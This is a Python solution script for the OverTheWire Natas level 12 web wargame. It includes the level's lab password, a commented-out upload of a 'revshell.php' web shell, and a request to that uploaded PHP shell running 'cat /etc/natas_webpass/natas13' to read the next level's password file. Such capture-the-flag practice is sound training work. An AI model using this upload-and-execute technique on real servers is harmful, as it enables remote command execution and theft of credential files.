#!/usr/bin/env python3
'''

https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas12.py
https://www.youtube.com/watch?v=fqwxYowJA0c&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=10
Level 12 → Level 13
Username: natas12
URL:      http://natas12.natas.labs.overthewire.org
password:   EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
problem:

'''
import base64

import requests
import re
import urllib
import sys



username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'


url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)



session = requests.Session()
# response = session.get(url, auth = (username, password) )
#response = session.post(url, files = { "uploadedfile" : open('revshell.php', 'rb') }, data = { "filename" : "revshell.php", "MAX_FILE_SIZE" : "1000" }, auth = (username, password) )

response = session.get( url + 'upload/ucdasje2cw.php?c=cat /etc/natas_webpass/natas13', auth = (username, password ))


content = response.text
 
print (content)